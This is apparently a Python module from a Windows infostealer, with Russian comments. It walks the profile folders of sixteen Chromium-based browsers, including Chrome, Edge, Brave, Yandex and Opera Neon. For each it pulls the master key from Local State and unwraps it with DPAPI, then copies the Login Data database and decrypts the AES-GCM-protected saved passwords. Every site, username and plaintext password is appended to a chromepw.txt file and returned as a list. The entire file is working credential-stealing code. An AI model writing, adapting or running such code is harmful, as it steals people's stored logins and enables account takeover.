import base64
import json
import os
import shutil
import sqlite3

import win32crypt
from Crypto.Cipher import AES

ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")

Browser_Path = {
    "Amigo": LOCAL + "\\Amigo\\User Data",
    "Torch": LOCAL + "\\Torch\\User Data",
    "Kometa": LOCAL + "\\Kometa\\User Data",
    "Orbitum": LOCAL + "\\Orbitum\\User Data",
    "CentBrowser": LOCAL + "\\CentBrowser\\User Data",
    "7Star": LOCAL + "\\7Star\\7Star\\User Data",
    "Sputnik": LOCAL + "\\Sputnik\\Sputnik\\User Data",
    "Vivaldi": LOCAL + "\\Vivaldi\\User Data",
    "Chrome SxS": LOCAL + "\\Google\\Chrome SxS\\User Data",
    "Epic Privacy": LOCAL + "\\Epic Privacy Browser\\User Data",
    "Chrome": LOCAL + "\\Google\\Chrome\\User Data",
    "Uran": LOCAL + "\\uCozMedia\\Uran\\User Data",
    "Edge": LOCAL + "\\Microsoft\\Edge\\User Data",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data",
    "Opera Neon": LOCAL + "\\Opera Software\\Opera Neon\\User Data",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data"
}


def get_secret_key(CHROME_PATH_LOCAL_STATE):
    try:
        with open(CHROME_PATH_LOCAL_STATE, 'r', encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        secret_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        secret_key = secret_key[5:]  # убираем 'DPAPI' из строки
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]

        return secret_key



    except:
        return None


def decrypt_password(ciphertext, secret_key):
    try:
        init_vector = ciphertext[3:15]

        encrypted_pass = ciphertext[15:-16]

        # Расшифровывавем
        cipher = AES.new(secret_key, AES.MODE_GCM, init_vector)
        decrypted_pass = cipher.decrypt(encrypted_pass)
        decrypted_pass = decrypted_pass.decode()

        return decrypted_pass

    except:
        return None


def get_db_connection(path, temp):
    try:
        shutil.copy2(path, os.path.join(temp, "browser.db"))

        return sqlite3.connect(os.path.join(temp, "browser.db"))
    except:
        return ''


def getchromepasswords(temp):
    logins = []
    for platform, path in Browser_Path.items():
        login_data_path = os.path.join(path, 'Default\Login Data')
        local_state_path = os.path.join(path, 'Local State')
        try:

            secret_key = get_secret_key(local_state_path)

            conn = get_db_connection(login_data_path, temp)

            if (secret_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if (url != "" and username != "" and ciphertext != ""):
                        decrypted_pass = decrypt_password(ciphertext, secret_key)
                        logins.append(platform)
                        logins.append(url)
                        logins.append(username)
                        logins.append(decrypted_pass)
                        file = open(os.path.join(temp, 'chromepw.txt'), 'a')
                        file.write(
                            "\n------------------------------------------------------------\nBrowser: %s\nURL: %s\nUser Name: %s\nPassword: %s" % (
                            platform, url, username, decrypted_pass))

                cursor.close()
                conn.close()
                os.remove(os.path.join(temp, "browser.db"))
                file.close()


        except:
            pass
    return logins
